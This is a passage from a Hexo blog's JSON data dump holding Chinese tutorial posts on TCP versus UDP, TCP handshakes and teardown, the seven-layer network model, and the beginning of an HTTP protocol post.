只是报文的搬运工，不会对报文进行任何拆分和拼接操作。</p>\n<p>具体来说</p>\n<ul>\n<li>在发送端，应用层将数据传递给传输层的 UDP 协议，UDP 只会给数据增加一个 UDP 头标识下是 UDP 协议，然后就传递给网络层了</li>\n<li>在接收端，网络层将数据传递给传输层，UDP 只去除 IP 报文头就传递给应用层，不会任何拼接操作</li>\n</ul>\n<h3 id=\"不可靠性\"><a href=\"#不可靠性\" class=\"headerlink\" title=\"不可靠性\"></a>不可靠性</h3><ol>\n<li>UDP 是无连接的，也就是说通信不需要建立和断开连接。</li>\n<li>UDP 也是不可靠的。协议收到什么数据就传递什么数据，并且也不会备份数据，对方能不能收到是不关心的</li>\n<li>UDP 没有拥塞控制，一直会以恒定的速度发送数据。即使网络条件不好，也不会对发送速率进行调整。这样实现的弊端就是在网络条件不好的情况下可能会导致丢包，但是优点也很明显，在某些实时性要求高的场景（比如电话会议）就需要使用 UDP 而不是 TCP。</li>\n</ol>\n<h3 id=\"高效\"><a href=\"#高效\" class=\"headerlink\" title=\"高效\"></a>高效</h3><p>因为 UDP 没有 TCP 那么复杂，需要保证数据不丢失且有序到达。所以 UDP 的头部开销小，只有八字节，相比 TCP 的至少二十字节要少得多，在传输数据报文时是很高效的。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/1/163195b245ceb89c?w=831&h=170&f=png&s=22793\" alt=\"UDP 头信息示意图\"></p>\n<p>头部包含了以下几个数据</p>\n<ul>\n<li>两个十六位的端口号，分别为源端口（可选字段）和目标端口</li>\n<li>整个数据报文的长度</li>\n<li>整个数据报文的检验和（IPv4 可选 字段），该字段用于发现头部信息和数据中的错误</li>\n</ul>\n<h3 id=\"传输方式\"><a href=\"#传输方式\" class=\"headerlink\" title=\"传输方式\"></a>传输方式</h3><p>UDP 不止支持一对一的传输方式，同样支持一对多，多对多，多对一的方式，也就是说 UDP 提供了单播，多播，广播的功能。</p>\n<h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><ol>\n<li> UDP 是一个非连接的协议，传输数据之前源端和终端不建立连接，当它想传送时就简单地去抓取来自应用程序的数据，并尽可能快地把它扔到网络上。在发送端，UDP传送数据的速度仅仅是受应用程序生成数据的速度、计算机的能力和传输带宽的限制；在接收端，UDP把每个消息段放在队列中，应用程序每次从队列中读一个消息段。</li>\n<li> 由于传输数据不建立连接，因此也就不需要维护连接状态，包括收发状态等，因此一台服务机可同时向多个客户机传输相同的消息。</li>\n<li> UDP 信息包的标题很短，只有8个字节，相对于 TCP 的 20 个字节信息包的额外开销很小。</li>\n<li> 吞吐量不受拥挤控制算法的调节，只受应用软件生成数据的速率、传输带宽、源端和终端主机性能的限制。</li>\n<li> UDP 使用尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的链接状态表（这里面有许多参数）。</li>\n<li> UDP 是面向报文的。发送方的UDP对应用程序交下来的报文，在添加首部后就向下交付给IP层。既不拆分，也不合并，而是保留这些报文的边界，因此，应用程序需要选择合适的报文大小。</li>\n</ol>\n<blockquote>\n<p>UDP 主要用在实时性要求高以及对质量相对较弱的地方，如流媒体、实时消息</p>\n</blockquote>\n<h2 id=\"二、TCP\"><a href=\"#二、TCP\" class=\"headerlink\" title=\"二、TCP\"></a>二、TCP</h2><p>TCP（Transmission Control Protocol，传输控制协议）</p>\n<p>TCP（Transmission Control Protocol，传输控制协议）是面向连接的协议，即在收发数据前，必须和对方建立可靠的连接。TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接：</p>\n<h3 id=\"头部\"><a href=\"#头部\" class=\"headerlink\" title=\"头部\"></a>头部</h3><p>对于 TCP 头部来说，以下几个字段是很重要的</p>\n<ul>\n<li>Sequence Number，(顺序号码)这个序号保证了 TCP 传输的报文都是有序的，对端可以通过序号顺序的拼接报文</li>\n<li>Acknowledgement Number，(确认号码)这个序号表示数据接收端期望接收的下一个字节的编号是多少，同时也表示上一个序号的数据已经收到</li>\n<li>Window Size，窗口大小，表示还能接收多少字节的数据，用于流量控制</li>\n<li>标识符<ul>\n<li>URG=1：(urgent 紧急) 该字段为一表示本数据报的数据部分包含紧急信息，是一个高优先级数据报文，此时紧急指针有效。紧急数据一定位于当前数据包数据部分的最前面，紧急指针标明了紧急数据的尾部。</li>\n<li>ACK=1：(acknowledgement 确认)该字段为一表示确认号字段有效。此外，TCP 还规定在连接建立后传送的所有报文段都必须把 ACK 置为一。</li>\n<li>PSH=1：(push 传送)该字段为一表示接收端应该立即将数据 push 给应用层，而不是等到缓冲区满后再提交。</li>\n<li>RST=1：(reset 重置)该字段为一表示当前 TCP 连接出现严重问题，可能需要重新建立 TCP 连接，也可以用于拒绝非法的报文段和拒绝连接请求。</li>\n<li>SYN=1：(synchronous 建立联机) 当SYN=1，ACK=0时，表示当前报文段是一个连接请求报文。当SYN=1，ACK=1时，表示当前报文段是一个同意建立连接的应答报文。</li>\n<li>FIN=1：(finish 结束)该字段为一表示此报文段是一个释放连接的请求报文。</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/1/1631be45b084e4bc?w=858&h=305&f=png&s=62112\" alt=\"TCP 头部示意图\"></p>\n<h3 id=\"状态机\"><a href=\"#状态机\" class=\"headerlink\" title=\"状态机\"></a>状态机</h3><p>HTTP 是无连接的，所以作为下层的 TCP 协议也是无连接的，虽然看似 TCP 将两端连接了起来，但是其实只是两端共同维护了一个状态</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/1/1631bef9e3c60035?w=1280&h=965&f=png&s=101432\" alt=\"TCP 状态机示意图\"></p>\n<p>LISTEN - 侦听来自远方 TCP 端口的连接请求；<br>SYN-SENT -在发送连接请求后等待匹配的连接请求；<br>SYN-RECEIVED - 在收到和发送一个连接请求后等待对连接请求的确认；<br>ESTABLISHED- 代表一个打开的连接，数据可以传送给用户；<br>FIN-WAIT-1 - 等待远程 TCP 的连接中断请求，或先前的连接中断请求的确认；<br>FIN-WAIT-2 - 从远程 TCP 等待连接中断请求；<br>CLOSE-WAIT - 等待从本地用户发来的连接中断请求；<br>CLOSING -等待远程 TCP 对连接中断的确认；<br>LAST-ACK - 等待原来发向远程 TCP 的连接中断请求的确认；<br>TIME-WAIT -等待足够的时间以确保远程 TCP 接收到连接中断请求的确认；<br>CLOSED - 没有任何连接状态；</p>\n<h3 id=\"建立连接（三次握手）\"><a href=\"#建立连接（三次握手）\" class=\"headerlink\" title=\"建立连接（三次握手）\"></a>建立连接（三次握手）</h3><p>在 TCP 协议中，主动发起请求的一端为客户端，被动连接的一端称为服务端。不管是客户端还是服务端，TCP 连接建立完后都能发送和接收数据，所以 TCP 也是一个全双工的协议。</p>\n<ul>\n<li>  第一次握手：主机A发送位码为syn＝1，随机产生seq number=1234567的数据包到服务器，主机B由SYN=1知道，A要求建立联机，A进入 SYN_SEND状态，等待主机B确认；</li>\n<li>  第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1)，syn=1，ack=1，随机产生seq=7654321的包，此时主机B进入SYN_RECV状态。；</li>\n<li>  第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1，以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1)，ack=1，主机B收到后确认seq值与ack=1则连接建立成功。此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。</li>\n</ul>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/1/1631bf1e79b3cd42?w=666&h=426&f=png&s=32121\" alt=\"TCP 三次握手示意图\"></p>\n<blockquote>\n<p>两支军队，分别由两个将军领导，正在准备攻击一个坚固的城市。两支军队都驻扎在城市旁边的两个不同的山谷里。两军之间隔着第三个山谷，两个将军想要通讯的唯一方法就是穿过第三个山谷传送信件。问题是，第三个山谷被城市的守卫军占据，并且经此传送的信件可能会被守卫军截获。</p>\n<ul>\n<li>第一次握手：A蓝数据成功到达B蓝，B蓝收到A蓝的通知“你准备好攻打红色部队了吗？”</li>\n<li>第二次握手：B蓝回复A蓝，“我准备好了！”。 假设回复成功到达A蓝，但是此时B蓝并不知道A蓝是否成功收到了它的回复，因此它并不敢轻举妄动，假设A蓝并没有收到回复，没有出兵，那B蓝岂不是会全军覆没。于是很有必要进行第三次握手。</li>\n<li>第三次握手：A蓝回复B蓝，“我知道你准备好了，开打吧！” 当B蓝收到这个确认之后，就可以开始出兵了。<br>理论上来说，两军的沟通永远停不下来，因为没有办法确认最后一次数据包是否成功到达对方，所以三次握手也并不是绝对的可靠，可以选择四次，甚至多次握手，但是考虑到开销，选择三次握手，能保证足够的可靠性了。</li>\n</ul>\n</blockquote>\n<h3 id=\"断开连接（四次挥手）\"><a href=\"#断开连接（四次挥手）\" class=\"headerlink\" title=\"断开连接（四次挥手）\"></a>断开连接（四次挥手）</h3><p>由于 TCP 连接是全双工的，因此每个方向都必须单独进行关闭。这个原则是当一方完成它的数据发送任务后就能发送一个 FIN 来终止这个方向的连接。收到一个 FIN 只意味着这一方向上没有数据流动，一个 TCP 连接在收到一个 FIN 后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。</p>\n<blockquote>\n<p>TCP的连接的拆除需要发送四个包，因此称为四次挥手(four-way handshake)。客户端或服务器均可主动发起挥手动作，在 socket 编程中，任何一方执行 close() 操作即可产生挥手操作。</p>\n</blockquote>\n<ol>\n<li>客户端A发送一个FIN，用来关闭客户A到服务器B的数据传送。 </li>\n<li>服务器B收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。和SYN一样，一个FIN将占用一个序号。 </li>\n<li>服务器B关闭与客户端A的连接，发送一个FIN给客户端A。 </li>\n<li>客户端A发回ACK报文确认，并将确认序号设置为收到序号加1。 </li>\n</ol>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/2/1631fb807f2c6c1b?w=640&h=512&f=png&s=31059\" alt=\"TCP 四次挥手示意图\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"TCP-与-UDP\"><a href=\"#TCP-与-UDP\" class=\"headerlink\" title=\"TCP  与 UDP\"></a>TCP  与 UDP</h1><p>当 IP 包通过路由将数据传输到目的地时，会根据 TCP 或 UDP 包头中的源端口和目的端口信息，请求和获取不同的应用。也就是说，不管 TCP 还是 UDP，都含有网络服务必须的源端口和目的端口信息，以建立和实现网络传输服务。</p>\n<p>在网络中，有些服务，如 HTTP、FTP 等，对数据的可靠性要求较高，在使用这些服务时，必须保证数据包能够完整无误的送达；而另外一些服务，如 DNS、即时聊天工具等，并不需要这么高的可靠性，高效率和实时性才是它们所关心的。根据这两种服务不同的需求，也就诞生了面向连接的 TCP 协议，以及面向无连接的 UDP 协议。</p>\n<p><strong>怎么理解 TCP 的面向连接和 UDP 的无连接（不面向连接）？</strong><br>TCP 关心分组是否准确送达，甚至仔细到给每个分组编号并收到目的端的确认才继续发送后续的分组，而 UDP 则不然，它只负责把分组封装好后直接发送到链路上，至于目的端收到与否并不关心。</p>\n<blockquote>\n<p>TCP 的面向连接指对话之前需要先建立一个会话，而 UDP 无连接直接发送消息（类似于打电话和写信）</p>\n</blockquote>\n<p>UDP 和 TCP 的特点</p>\n<ul>\n<li>用户数据报协议 UDP（User Datagram Protocol）是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部），支持一对一、一对多、多对一和多对多的交互通信。</li>\n<li>传输控制协议 TCP（Transmission Control Protocol）是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块），每一条 TCP 连接只能是点对点的（一对一）。</li>\n</ul>\n<blockquote>\n<p>TCP 协议为了更容易传送大数据才把数据分割，而且 TCP 协议能够确认数据最终是否送达到对方</p>\n</blockquote>\n<h2 id=\"一、UDP\"><a href=\"#一、UDP\" class=\"headerlink\" title=\"一、UDP\"></a>一、UDP</h2><p>UDP（User Data Protocol，用户数据报协议）是一种无连接的协议，提供面向事务的简单不可靠信息传送服务。UDP 协议的主要作用是将网络数据流量压缩成数据包的形式。一个典型的数据包就是一个二进制数据的传输单位，每一个数据包的前 8 个字节用来包含报头信息，剩余字节则用来包含具体的传输数据。</p>\n<h3 id=\"面向报文\"><a href=\"#面向报文\" class=\"headerlink\" title=\"面向报文\"></a>面向报文</h3><p>UDP 是一个面向报文（报文可以理解为一段段的数据）的协议。意思就是 UDP 只是报文的搬运工，不会对报文进行任何拆分和拼接操作。</p>\n<p>具体来说</p>\n<ul>\n<li>在发送端，应用层将数据传递给传输层的 UDP 协议，UDP 只会给数据增加一个 UDP 头标识下是 UDP 协议，然后就传递给网络层了</li>\n<li>在接收端，网络层将数据传递给传输层，UDP 只去除 IP 报文头就传递给应用层，不会任何拼接操作</li>\n</ul>\n<h3 id=\"不可靠性\"><a href=\"#不可靠性\" class=\"headerlink\" title=\"不可靠性\"></a>不可靠性</h3><ol>\n<li>UDP 是无连接的，也就是说通信不需要建立和断开连接。</li>\n<li>UDP 也是不可靠的。协议收到什么数据就传递什么数据，并且也不会备份数据，对方能不能收到是不关心的</li>\n<li>UDP 没有拥塞控制，一直会以恒定的速度发送数据。即使网络条件不好，也不会对发送速率进行调整。这样实现的弊端就是在网络条件不好的情况下可能会导致丢包，但是优点也很明显，在某些实时性要求高的场景（比如电话会议）就需要使用 UDP 而不是 TCP。</li>\n</ol>\n<h3 id=\"高效\"><a href=\"#高效\" class=\"headerlink\" title=\"高效\"></a>高效</h3><p>因为 UDP 没有 TCP 那么复杂，需要保证数据不丢失且有序到达。所以 UDP 的头部开销小，只有八字节，相比 TCP 的至少二十字节要少得多，在传输数据报文时是很高效的。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/1/163195b245ceb89c?w=831&h=170&f=png&s=22793\" alt=\"UDP 头信息示意图\"></p>\n<p>头部包含了以下几个数据</p>\n<ul>\n<li>两个十六位的端口号，分别为源端口（可选字段）和目标端口</li>\n<li>整个数据报文的长度</li>\n<li>整个数据报文的检验和（IPv4 可选 字段），该字段用于发现头部信息和数据中的错误</li>\n</ul>\n<h3 id=\"传输方式\"><a href=\"#传输方式\" class=\"headerlink\" title=\"传输方式\"></a>传输方式</h3><p>UDP 不止支持一对一的传输方式，同样支持一对多，多对多，多对一的方式，也就是说 UDP 提供了单播，多播，广播的功能。</p>\n<h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><ol>\n<li> UDP 是一个非连接的协议，传输数据之前源端和终端不建立连接，当它想传送时就简单地去抓取来自应用程序的数据，并尽可能快地把它扔到网络上。在发送端，UDP传送数据的速度仅仅是受应用程序生成数据的速度、计算机的能力和传输带宽的限制；在接收端，UDP把每个消息段放在队列中，应用程序每次从队列中读一个消息段。</li>\n<li> 由于传输数据不建立连接，因此也就不需要维护连接状态，包括收发状态等，因此一台服务机可同时向多个客户机传输相同的消息。</li>\n<li> UDP 信息包的标题很短，只有8个字节，相对于 TCP 的 20 个字节信息包的额外开销很小。</li>\n<li> 吞吐量不受拥挤控制算法的调节，只受应用软件生成数据的速率、传输带宽、源端和终端主机性能的限制。</li>\n<li> UDP 使用尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的链接状态表（这里面有许多参数）。</li>\n<li> UDP 是面向报文的。发送方的UDP对应用程序交下来的报文，在添加首部后就向下交付给IP层。既不拆分，也不合并，而是保留这些报文的边界，因此，应用程序需要选择合适的报文大小。</li>\n</ol>\n<blockquote>\n<p>UDP 主要用在实时性要求高以及对质量相对较弱的地方，如流媒体、实时消息</p>\n</blockquote>\n<h2 id=\"二、TCP\"><a href=\"#二、TCP\" class=\"headerlink\" title=\"二、TCP\"></a>二、TCP</h2><p>TCP（Transmission Control Protocol，传输控制协议）</p>\n<p>TCP（Transmission Control Protocol，传输控制协议）是面向连接的协议，即在收发数据前，必须和对方建立可靠的连接。TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接：</p>\n<h3 id=\"头部\"><a href=\"#头部\" class=\"headerlink\" title=\"头部\"></a>头部</h3><p>对于 TCP 头部来说，以下几个字段是很重要的</p>\n<ul>\n<li>Sequence Number，(顺序号码)这个序号保证了 TCP 传输的报文都是有序的，对端可以通过序号顺序的拼接报文</li>\n<li>Acknowledgement Number，(确认号码)这个序号表示数据接收端期望接收的下一个字节的编号是多少，同时也表示上一个序号的数据已经收到</li>\n<li>Window Size，窗口大小，表示还能接收多少字节的数据，用于流量控制</li>\n<li>标识符<ul>\n<li>URG=1：(urgent 紧急) 该字段为一表示本数据报的数据部分包含紧急信息，是一个高优先级数据报文，此时紧急指针有效。紧急数据一定位于当前数据包数据部分的最前面，紧急指针标明了紧急数据的尾部。</li>\n<li>ACK=1：(acknowledgement 确认)该字段为一表示确认号字段有效。此外，TCP 还规定在连接建立后传送的所有报文段都必须把 ACK 置为一。</li>\n<li>PSH=1：(push 传送)该字段为一表示接收端应该立即将数据 push 给应用层，而不是等到缓冲区满后再提交。</li>\n<li>RST=1：(reset 重置)该字段为一表示当前 TCP 连接出现严重问题，可能需要重新建立 TCP 连接，也可以用于拒绝非法的报文段和拒绝连接请求。</li>\n<li>SYN=1：(synchronous 建立联机) 当SYN=1，ACK=0时，表示当前报文段是一个连接请求报文。当SYN=1，ACK=1时，表示当前报文段是一个同意建立连接的应答报文。</li>\n<li>FIN=1：(finish 结束)该字段为一表示此报文段是一个释放连接的请求报文。</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/1/1631be45b084e4bc?w=858&h=305&f=png&s=62112\" alt=\"TCP 头部示意图\"></p>\n<h3 id=\"状态机\"><a href=\"#状态机\" class=\"headerlink\" title=\"状态机\"></a>状态机</h3><p>HTTP 是无连接的，所以作为下层的 TCP 协议也是无连接的，虽然看似 TCP 将两端连接了起来，但是其实只是两端共同维护了一个状态</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/1/1631bef9e3c60035?w=1280&h=965&f=png&s=101432\" alt=\"TCP 状态机示意图\"></p>\n<p>LISTEN - 侦听来自远方 TCP 端口的连接请求；<br>SYN-SENT -在发送连接请求后等待匹配的连接请求；<br>SYN-RECEIVED - 在收到和发送一个连接请求后等待对连接请求的确认；<br>ESTABLISHED- 代表一个打开的连接，数据可以传送给用户；<br>FIN-WAIT-1 - 等待远程 TCP 的连接中断请求，或先前的连接中断请求的确认；<br>FIN-WAIT-2 - 从远程 TCP 等待连接中断请求；<br>CLOSE-WAIT - 等待从本地用户发来的连接中断请求；<br>CLOSING -等待远程 TCP 对连接中断的确认；<br>LAST-ACK - 等待原来发向远程 TCP 的连接中断请求的确认；<br>TIME-WAIT -等待足够的时间以确保远程 TCP 接收到连接中断请求的确认；<br>CLOSED - 没有任何连接状态；</p>\n<h3 id=\"建立连接（三次握手）\"><a href=\"#建立连接（三次握手）\" class=\"headerlink\" title=\"建立连接（三次握手）\"></a>建立连接（三次握手）</h3><p>在 TCP 协议中，主动发起请求的一端为客户端，被动连接的一端称为服务端。不管是客户端还是服务端，TCP 连接建立完后都能发送和接收数据，所以 TCP 也是一个全双工的协议。</p>\n<ul>\n<li>  第一次握手：主机A发送位码为syn＝1，随机产生seq number=1234567的数据包到服务器，主机B由SYN=1知道，A要求建立联机，A进入 SYN_SEND状态，等待主机B确认；</li>\n<li>  第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1)，syn=1，ack=1，随机产生seq=7654321的包，此时主机B进入SYN_RECV状态。；</li>\n<li>  第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1，以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1)，ack=1，主机B收到后确认seq值与ack=1则连接建立成功。此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。</li>\n</ul>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/1/1631bf1e79b3cd42?w=666&h=426&f=png&s=32121\" alt=\"TCP 三次握手示意图\"></p>\n<blockquote>\n<p>两支军队，分别由两个将军领导，正在准备攻击一个坚固的城市。两支军队都驻扎在城市旁边的两个不同的山谷里。两军之间隔着第三个山谷，两个将军想要通讯的唯一方法就是穿过第三个山谷传送信件。问题是，第三个山谷被城市的守卫军占据，并且经此传送的信件可能会被守卫军截获。</p>\n<ul>\n<li>第一次握手：A蓝数据成功到达B蓝，B蓝收到A蓝的通知“你准备好攻打红色部队了吗？”</li>\n<li>第二次握手：B蓝回复A蓝，“我准备好了！”。 假设回复成功到达A蓝，但是此时B蓝并不知道A蓝是否成功收到了它的回复，因此它并不敢轻举妄动，假设A蓝并没有收到回复，没有出兵，那B蓝岂不是会全军覆没。于是很有必要进行第三次握手。</li>\n<li>第三次握手：A蓝回复B蓝，“我知道你准备好了，开打吧！” 当B蓝收到这个确认之后，就可以开始出兵了。<br>理论上来说，两军的沟通永远停不下来，因为没有办法确认最后一次数据包是否成功到达对方，所以三次握手也并不是绝对的可靠，可以选择四次，甚至多次握手，但是考虑到开销，选择三次握手，能保证足够的可靠性了。</li>\n</ul>\n</blockquote>\n<h3 id=\"断开连接（四次挥手）\"><a href=\"#断开连接（四次挥手）\" class=\"headerlink\" title=\"断开连接（四次挥手）\"></a>断开连接（四次挥手）</h3><p>由于 TCP 连接是全双工的，因此每个方向都必须单独进行关闭。这个原则是当一方完成它的数据发送任务后就能发送一个 FIN 来终止这个方向的连接。收到一个 FIN 只意味着这一方向上没有数据流动，一个 TCP 连接在收到一个 FIN 后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。</p>\n<blockquote>\n<p>TCP的连接的拆除需要发送四个包，因此称为四次挥手(four-way handshake)。客户端或服务器均可主动发起挥手动作，在 socket 编程中，任何一方执行 close() 操作即可产生挥手操作。</p>\n</blockquote>\n<ol>\n<li>客户端A发送一个FIN，用来关闭客户A到服务器B的数据传送。 </li>\n<li>服务器B收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。和SYN一样，一个FIN将占用一个序号。 </li>\n<li>服务器B关闭与客户端A的连接，发送一个FIN给客户端A。 </li>\n<li>客户端A发回ACK报文确认，并将确认序号设置为收到序号加1。 </li>\n</ol>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/2/1631fb807f2c6c1b?w=640&h=512&f=png&s=31059\" alt=\"TCP 四次挥手示意图\"></p>\n"},{"title":"TCP/IP 协议","date":"2021-01-14T07:34:00.000Z","_content":"\n# TCP/IP 协议\n\n网络七层模型，从上至下依次为：\n\n* 应用层 ：为特定应用程序提供数据传输服务，例如 `HTTP`、`DNS` 等。数据单位为报文。\n* 表示层 ：数据压缩、加密以及数据描述，这使得应用程序不必关心在各台主机中数据内部格式不同的问题。\n* 会话层 ：建立及管理会话。\n* 传输层 ：为进程提供通用数据传输服务。由于应用层协议很多，定义通用的传输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。TCP 主要提供完整性服务，UDP 主要提供及时性服务。\n* 网络层 ：为主机提供数据传输服务。而传输层协议是为主机中的进程提供数据传输服务。网络层把传输层传递下来的报文段或者用户数据报封装成分组。\n* 数据链路层 ：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的主机提供数据传输服务。数据链路层把网络层传下来的分组封装成帧。\n* 物理层 ：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。\n","source":"_posts/HTTP/TCP-IP 协议.md","raw":"---\ntitle: TCP/IP 协议\ncategories: HTTP\ntags: [HTTP]\ndate: 2021-01-14 15:34:00\n---\n\n# TCP/IP 协议\n\n网络七层模型，从上至下依次为：\n\n* 应用层 ：为特定应用程序提供数据传输服务，例如 `HTTP`、`DNS` 等。数据单位为报文。\n* 表示层 ：数据压缩、加密以及数据描述，这使得应用程序不必关心在各台主机中数据内部格式不同的问题。\n* 会话层 ：建立及管理会话。\n* 传输层 ：为进程提供通用数据传输服务。由于应用层协议很多，定义通用的传输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。TCP 主要提供完整性服务，UDP 主要提供及时性服务。\n* 网络层 ：为主机提供数据传输服务。而传输层协议是为主机中的进程提供数据传输服务。网络层把传输层传递下来的报文段或者用户数据报封装成分组。\n* 数据链路层 ：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的主机提供数据传输服务。数据链路层把网络层传下来的分组封装成帧。\n* 物理层 ：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。\n","slug":"HTTP/TCP-IP 协议","published":1,"updated":"2021-04-30T07:23:28.326Z","_id":"cko3z7shv000dmi6rdduv1lmn","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"TCP-IP-协议\"><a href=\"#TCP-IP-协议\" class=\"headerlink\" title=\"TCP/IP 协议\"></a>TCP/IP 协议</h1><p>网络七层模型，从上至下依次为：</p>\n<ul>\n<li>应用层 ：为特定应用程序提供数据传输服务，例如 <code>HTTP</code>、<code>DNS</code> 等。数据单位为报文。</li>\n<li>表示层 ：数据压缩、加密以及数据描述，这使得应用程序不必关心在各台主机中数据内部格式不同的问题。</li>\n<li>会话层 ：建立及管理会话。</li>\n<li>传输层 ：为进程提供通用数据传输服务。由于应用层协议很多，定义通用的传输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。TCP 主要提供完整性服务，UDP 主要提供及时性服务。</li>\n<li>网络层 ：为主机提供数据传输服务。而传输层协议是为主机中的进程提供数据传输服务。网络层把传输层传递下来的报文段或者用户数据报封装成分组。</li>\n<li>数据链路层 ：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的主机提供数据传输服务。数据链路层把网络层传下来的分组封装成帧。</li>\n<li>物理层 ：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"TCP-IP-协议\"><a href=\"#TCP-IP-协议\" class=\"headerlink\" title=\"TCP/IP 协议\"></a>TCP/IP 协议</h1><p>网络七层模型，从上至下依次为：</p>\n<ul>\n<li>应用层 ：为特定应用程序提供数据传输服务，例如 <code>HTTP</code>、<code>DNS</code> 等。数据单位为报文。</li>\n<li>表示层 ：数据压缩、加密以及数据描述，这使得应用程序不必关心在各台主机中数据内部格式不同的问题。</li>\n<li>会话层 ：建立及管理会话。</li>\n<li>传输层 ：为进程提供通用数据传输服务。由于应用层协议很多，定义通用的传输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。TCP 主要提供完整性服务，UDP 主要提供及时性服务。</li>\n<li>网络层 ：为主机提供数据传输服务。而传输层协议是为主机中的进程提供数据传输服务。网络层把传输层传递下来的报文段或者用户数据报封装成分组。</li>\n<li>数据链路层 ：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的主机提供数据传输服务。数据链路层把网络层传下来的分组封装成帧。</li>\n<li>物理层 ：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。</li>\n</ul>\n"},{"title":"HTTP 协议","date":"2021-01-14T07:39:00.000Z","_content":"\n# HTTP 协议\n\n### 1、定义\nHTTP协议即超文本传送协议 (Hypertext Transfer Protocol )，是建立在TCP协议之上的一种应用。HTTP连接最显著的特点是客户端发送的每次请求都需要服务器回送响应，在请求结束后，会主动释放连接。从建立连接到关闭连接的过程称为 \"一次连接\"。\n\n1. 在HTTP 1.0 中客户端的每次请求都要求建立一次单独的连接，在处理完本次请求后，就自动释放连接。\n2. 在HTTP 1.1 中可以在一次连接中处理多个请求，并且多个请求可以重叠进行，不需要等待一个请求结束后再发送下一个请求。\n\n\n由于 HTTP 在每次请求结束后都会主动释放连接，因此 HTTP 连接是一种\"短连接\"要保持客户端程序的在线状态，需要不断地向服务器发起连接请求。通常的做法是即时不需要获得任何数据，客户端也保持每隔一段固定的时间向服务器发送一次“保持连接”的请求，服务器在收到该请求后对客户端进行回复，表明知道客户端“在线”。若服务器长时间无法收到客户端的请求，则认为客户端“下线”，若客户端长时间无法收到服务器的回复，则认为网络已经断开。\n\n**http报文是在http应用程序之间传递的数据块，这些数据描述了报文的内容和含义，以及数据部分**\n\n### 2、组成\n\n报文的组成：起始行、首部、主体\n\n```\n// http 请求报文\nGET /home/index.html http/1.0 //起始行\n\nHost: www.abc.com //首部\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 //首部\n\n\n// http 响应报文\nHTTP/1.0 200 OK //起始行\n\nContent-type:text/plain //首部\nContent-length:19 //首部\n\nHi I'm a message! 主体\n```\n\n\n### 3、首部头信息\n\n* 通用首部: 提供报文相关的最基本的信息，可在请求报文、响应报文中使用\n    * Connection: 表示是否需要持久连接\n    * Date: 